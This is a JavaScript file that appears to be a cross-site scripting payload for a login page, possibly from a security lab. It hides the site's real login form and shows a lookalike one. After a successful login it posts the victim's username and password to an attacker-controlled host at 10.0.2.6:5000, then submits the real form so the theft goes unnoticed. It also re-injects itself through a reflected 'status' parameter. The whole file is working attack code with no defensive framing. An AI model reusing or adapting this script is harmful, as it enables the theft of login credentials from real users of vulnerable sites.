// Tries to find dynamically from url, otherwises hardcoded.
var attacker_conn = "10.0.2.6:5000"

// Get attacker IP from url query.
var query_string = window.location.search;
var url_params = new URLSearchParams(query_string);
if (url_params.has("status"))
{
	const parser = new DOMParser();
	const html = parser.parseFromString(url_params.get("status"), "text/html");
	var script = html.getElementsByTagName("script")[0];
	attacker_conn = script.src.split("/")[2];
}

// Hide original login form.
document.getElementById("login_form").style.display="none";

// Store user credentials.
var username = "";
var password = "";
var params = "";

// Create fake login form.
var fake_form = document.createElement("form");
fake_form.setAttribute("id", "fake_form");
fake_form.setAttribute("action", "");
fake_form.setAttribute("method", "POST");

var user_input = document.createElement("input");
user_input.setAttribute("id", "fake_username");
user_input.setAttribute("type", "text");
user_input.setAttribute("autocomplete", "off");
user_input.setAttribute("placeholder", "Username");
user_input.setAttribute("name", "username");
user_input.setAttribute("value", "");

var pass_input = document.createElement("input");
pass_input.setAttribute("id", "fake_password");
pass_input.setAttribute("type", "password");
pass_input.setAttribute("autocomplete", "off");
pass_input.setAttribute("placeholder", "Password");
pass_input.setAttribute("name", "password");
pass_input.setAttribute("value", "");

var submit_btn = document.createElement("input");
submit_btn.setAttribute("class", "btn btn-default");
submit_btn.setAttribute("type", "button");
submit_btn.setAttribute("value", "Login");
submit_btn.setAttribute("onClick", "fake_login()");

var status_text = document.createElement("p");
status_text.setAttribute("id", "status_text");
status_text.setAttribute("class", "status");

fake_form.appendChild(user_input);
fake_form.appendChild(pass_input);
fake_form.appendChild(submit_btn);

// Add fake form to page.
var container = document.getElementsByClassName("container")[0];
container.appendChild(fake_form);
container.appendChild(status_text);

// Fake submit button callback.
function fake_login() 
{
	// Store credentials from fake form.
	username = document.getElementById("fake_username").value;
	password = document.getElementById("fake_password").value;
	params = "username=" + username + "&password=" + password;
	
	var req = new XMLHttpRequest();
	
	// Listen for results from original server forwarding.
	req.onreadystatechange = function() 
	{
		if (req.readyState == XMLHttpRequest.DONE) 
		{
			// Successful login, forward to attacker.
			if (req.responseURL.includes("home"))
			{
				var atk_req = new XMLHttpRequest();
				atk_req.open("POST", "http://" + attacker_conn + "/login", false);
				atk_req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				atk_req.setRequestHeader("Access-Control-Allow-Origin", "*");
				atk_req.send(params);
				
				// Fill in and submit real form.
				document.getElementById('username').value = username
				document.getElementById('password').value = password
				document.getElementById("login_form").submit()
			}
			// Unsuccessful login, parse out status text to display.
			else if (req.responseURL.includes("status="))
			{
				// Parse query string.
				var query_string = req.responseURL.split("?")[1]
				var url_params = new URLSearchParams(query_string);
				
				// Append status text below fake form if any.
				if (url_params.has("status"))
				{
					var fake_status = document.getElementsByClassName("status")[1];
					fake_status.innerHTML = url_params.get("status");
				}
				
				// Clear input boxes to mimic real behavior.
				document.getElementById("fake_username").value = "";
				document.getElementById("fake_password").value = "";
			}
		}
	}
	
	// Forward credentials to real server.
	req.open("POST", "/login", false);
	req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	req.setRequestHeader("Access-Control-Allow-Origin", "*");
	req.send(params + '&status=<script type="text/javascript" src="http://' + attacker_conn + '/static/js/exploit.js"></script>');
}
